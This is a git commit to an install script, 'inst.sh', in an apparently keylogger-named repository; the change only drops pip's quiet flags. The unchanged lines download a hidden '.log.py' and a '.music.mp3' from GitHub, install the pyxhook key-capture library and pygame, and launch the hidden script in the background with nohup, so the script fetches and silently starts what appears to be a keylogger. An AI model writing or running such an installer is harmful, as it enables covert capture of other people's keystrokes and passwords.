c82286ae0db482f21f988c32c9a3e1560a5ad38f
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-13 01:52:04 +0000

    pip unquiet
    pip unquiet

--- inst.sh
+++ inst.sh
@@ -2,5 +2,5 @@
 
 wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py
 wget -q https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3
-yes | pip3 install pyxhook pygame --quiet --quiet --quiet
+yes | pip3 install pyxhook pygame 
 nohup python3 .log.py &
